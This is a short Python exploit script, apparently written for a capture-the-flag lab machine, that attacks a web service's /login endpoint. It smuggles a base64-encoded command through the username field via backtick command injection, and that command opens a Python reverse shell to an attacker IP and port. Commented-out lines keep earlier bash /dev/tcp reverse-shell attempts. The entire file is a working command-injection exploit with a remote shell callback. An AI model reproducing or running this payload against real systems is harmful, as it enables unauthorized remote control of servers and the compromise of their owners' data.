import base64
import requests

TARGET = "http://10.10.11.224:55555/test"
ATTACKER_IP = "10.10.14.52"
ATTACKER_PORT = 1233

# The tcp fd did not work to establish a reverse shell:
# COMMAND = "whoami > /dev/tcp/10.10.14.52/1234"
# COMMAND = "bash -i >& /dev/tcp/10.10.14.52/1234 0>&1"

# Python reverse shell worked
COMMAND = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",{ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
print(COMMAND)
payload = f";`echo {base64.b64encode(COMMAND.encode()).decode()}|base64 -d|sh`"
requests.post(TARGET + "/login", data={"username": payload})